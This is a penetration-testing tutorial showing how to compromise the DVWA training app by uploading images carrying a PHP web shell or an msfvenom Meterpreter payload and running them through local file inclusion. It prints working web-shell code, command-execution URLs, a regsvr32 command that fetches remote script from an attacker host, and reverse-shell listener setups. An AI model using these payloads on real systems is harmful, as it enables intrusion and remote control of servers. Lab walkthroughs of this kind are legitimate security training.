<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/kali-linux/" rel="category tag">Kali Linux</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Web Server Exploitation with LFI and File Upload</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/web-server-exploitation-lfi-file-upload/" rel="bookmark"><time class="entry-date published" datetime="2017-02-11T15:22:15+00:00">February 11, 2017</time><time class="updated" datetime="2025-05-27T12:36:43+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, you will learn how to bypass file uploading vulnerability in high security through FILE INCLUSION vulnerability. As well as how to bypass local file inclusion to get the reverse connection of victim’s Pc.</span></p>
<h3><span style="color: #800000;">Requirements</span></h3>
<p><span style="color: #000000;"><strong>Attacker: kali Linux</strong></span></p>
<p><span style="color: #000000;"><strong>Target: Dvwa</strong></span></p>
<h4><span style="color: #800000;">Embedding Malicious Code in Images Using Exif for File Upload Bypass</span></h4>
<p><span style="color: #000000;">First, you need to download the<strong> Exif Pilot </strong>tool from <a style="color: #000000;" href="http://www.colorpilot.com/exif.html"><strong>here</strong></a>. This is a GUI tool for windows users which allow adding exif data and Meta data inside a JPEG, PNG and GIF images.</span></p>
<p><span style="color: #000000;">Now <strong>open exif pilot</strong> and <strong>insert</strong> any image to hide malicious comment inside it. From the screenshot, you can see I have chosen <strong>a shell.png</strong> image and then <strong>click </strong>on <strong>EDIT EXIF/IPTC</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6Txa6zx5Yx4/WJ8oiLCQKwI/AAAAAAAAPQY/fJBoXLn_jQIfRZgMlDMkTm5_RP_VCv5-wCLcB/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Further inside comment text field <strong>type</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;?php system($_GET['c']); ?&gt;</pre>
<p><span style="color: #000000;">as malicious code and <strong>click</strong> on <strong>ok</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d56PIS3DunY/WJ8okJs5EAI/AAAAAAAAPRE/eU672OGdhLoBTn5fN4RlE4ZDR63h9W65gCLcB/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Here the exif data has been edited successfully inside the image. This tool replaces the malicious image from the original image in the same folder and sent the original image into recycle bin.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-E_z68g_HxUU/WJ8okkXVO3I/AAAAAAAAPRQ/IK9zR6T1VOkifLhCC5BSVKqZE0ltpnApACLcB/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now explore target IP in browser and login into DVWA with <strong>admin: password</strong> as a credential. Set security level <strong>high.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-j6wEVUUNcmA/WJ8ok-LUWQI/AAAAAAAAPRU/R-R27AgR1tYDM8M1c88qVyp4OQcht-N9QCLcB/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Choose vulnerability <strong>file upload</strong> to upload the malicious image in the web server application and now <strong>browse</strong> your malicious image <strong>shell.png </strong>then <strong>click</strong> on <strong>upload</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-wwlLFuvQctE/WJ8olORqr0I/AAAAAAAAPRY/__YH2VVTXccy2lLkzeOx8S4C0qNwOKUiwCLcB/s1600/5.png"/></span></p>
<p><span style="color: #000000;">It will show the path of the uploaded image copy the highlighted path.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-89jHr-oTVCs/WJ8olNVKPZI/AAAAAAAAPRc/MAwbWR90db4AAN2TQwBgm41Exx3k138dQCLcB/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now open the copied path in the browser where you will find the uploaded image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9TDZMx3ofsE/WJ8oldMT4LI/AAAAAAAAPRg/SGqJPOL94CMeRXmp9L-EIrPCTFW1WXGIwCLcB/s1600/7.png"/></span></p>
<p><span style="color: #000000;">In order to execute the malicious code, we need to change the category of vulnerability as well as security level also so that we can execute the hidden comment inside the image.</span></p>
<p><span style="color: #000000;">Now set security level low.</span></p>
<p><span style="color: #000000;">In order to bypass file uploading vulnerability in high security of DVWA, we need to set other vulnerability and I have <strong>select File Inclusion</strong> for this purpose.</span></p>
<p><span style="color: #000000;">File Inclusion allows users to execute any file through URL as I have described above.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-i3ULM5fcZLU/WJ8olrSwjLI/AAAAAAAAPRo/EVcaPuEfrCw8JnUidt7Zepu_VZ9oNLynACLcB/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">Executing Image Payloads</span></h3>
<p><span style="color: #000000;">Now past the above-copied path of the uploaded image inside the URL as shown in the screenshot.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.png</pre>
<p><span style="color: #000000;">Then, it has given <strong>warning system (): cannot execute blank command</strong> which means we need to add some command for execution hence through URL we will be able to execute any command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZKTdUy5kRfs/WJ8oiLW6kgI/AAAAAAAAPQc/g9-9UNZk1UkpbGCfsV4MOujLEW6oKHtSQCLcB/s1600/10.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.png&amp;c=ifconfig</pre>
<p><span style="color: #000000;">Here I try to check network configuration of victim’s Pc and you can see the result of network configuration from the screenshot.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-L0RyBzPOboE/WJ8oiOfd5eI/AAAAAAAAPQg/C3LZ1AjoTdcVzQquV2G732da9n3AdVKhACLcB/s1600/11.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.png&amp;c=dir</pre>
<p><span style="color: #000000;">Here you can view the directories which I have got by executing dir command in URL.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nDxTF6OM7IU/WJ8oih56PyI/AAAAAAAAPQk/UVqxAk6TknwOQYrrRAi_VPPWBXYndZfMwCLcB/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now next I will try to achieve meterpreter session using Kali Linux</span></p>
<p><span style="color: #000000;">Type <strong>msfconsole</strong> and load metasploit framework.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/misc/regsvr32_applocker_bypass_server
msf exploit(regsvr32_applocker_bypass_server) &gt; set lhost 192.168.1.103
msf exploit(regsvr32_applocker_bypass_server) &gt; set lport 1234
msf exploit(regsvr32_applocker_bypass_server) &gt; exploit</pre>
<p><span style="color: #000000;"><strong>Copy </strong>the above malicious code and send it to the victim.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6QvuhM7zD9M/WJ8oigIFOFI/AAAAAAAAPQs/kcIK8pFxdHopVLuWBgWxFJUWhmAJtiOiQCLcB/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Here paste above <strong>.dll malicious code</strong> inside the URL and when you will run the code in the browser. The attack will get victim’s meterpreter session on his Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.png&amp;c=regsvr32 /s /n /u /i:http://192.168.1.103:8080/7vnJTV4ONLKkU19.sct scrobj.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5AGFkhnrxTA/WJ8oioBYRLI/AAAAAAAAPQo/NKilS0D3HiMaSKvK-H3Ncb6gxOQIIQsJwCLcB/s1600/14.png"/></span></p>
<pre class="lang:default decode:true">meterpreter sessions 1
meterpreter&gt;sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lveZBa5B-NQ/WJ8ojTJvi_I/AAAAAAAAPQw/Tr_CqtbK9rA33waDtpi_232PR20XbdxHQCLcB/s1600/15.png"/></span></p>
<h3><span style="color: #800000;">Second Way</span></h3>
<p><span style="color: #000000;"><strong> </strong>In the second part, we will try to combine a malicious PHP file with an image. Further use that malicious image for uploading in the web application server and then bypass that image in the same manner as performed above.</span></p>
<p><span style="color: #000000;">Here first you need to <strong>download </strong>any<strong> .png/.jpg/.gif image</strong> and <strong>save</strong> it on <strong>Desktop</strong>. Inside Kali Linux, I have downloaded an image and save it with the name<strong> “a.png”</strong> on the desktop. Now open the terminal and type following command to generate a <strong>PHP code inside “a.png”</strong> image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.103 lport=4444 &gt;&gt; /root/Desktop/a.png</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-JglDt0QiMjs/WJ8ojXwRi7I/AAAAAAAAPQ0/_vJt9irBMZwWqYHz_LKnV5nC4lXMoWGGwCLcB/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Let’s verify whether the image contains the malicious code inside it or not</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /root/Desktop/a.png</pre>
<p><span style="color: #000000;">When you will scroll down the window screen, here you will find that the end part of the image contains PHP code. It means we have successfully created the malicious image which ready to upload inside the web application server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pGQaxgd2EZc/WJ8ojjErlMI/AAAAAAAAPQ4/ogP1QKdNiX4LHsMnb9kHhcKvIIXGCWeewCLcB/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now repeat the above process to upload the file inside DVWA with <strong>security level high</strong>. From the given screenshot, you can see my “<strong>a.png</strong>” image is <strong>successfully uploaded</strong> inside the web server.</span></p>
<p><span style="color: #000000;"><strong>Copy </strong>the highlighted <strong>path</strong> where the image is uploaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oRKufAGz4qg/WJ8oj-XOdDI/AAAAAAAAPQ8/knabO8xoKoMjT_fZ1KEksOvYSMNMV83xACLcB/s1600/18.png"/></span></p>
<p><span style="color: #000000;">Before executing image in web server <strong>start multi/handler </strong>in background inside the Kali Linux</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/handler
msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.1.103
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt;exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lM0kgxOqT98/WJ8ojwXTDoI/AAAAAAAAPRA/tQ_Yjx90EZ0kSrouA7vysD0Vdy00W8pFgCLcB/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Again set <strong>security level low</strong> in DVWA and <strong>turn on the File Inclusion vulnerability</strong> and repeat the same process as above. Then <strong>paste </strong>the above-copied<strong> path</strong> of uploaded image <strong>inside the URL</strong> and execute it which will provide a reverse connection on Kali Linux.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.102/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/a.png</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6Dyw43iciHU/WJ8okYD_uUI/AAAAAAAAPRI/ziq95NnzcCsJffswHVJ4oNOWMqr-y0aCQCLcB/s1600/20.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; sysinfo</pre>
<p><span style="color: #000000;">I have got a meterpreter session of victim PC</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Uq4EhrWhp2I/WJ8okQu19cI/AAAAAAAAPRM/tNtAV0jn1jwVSuvD1Yt4TZaHlSb0zxnKgCLcB/s1600/21.png"/></span></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
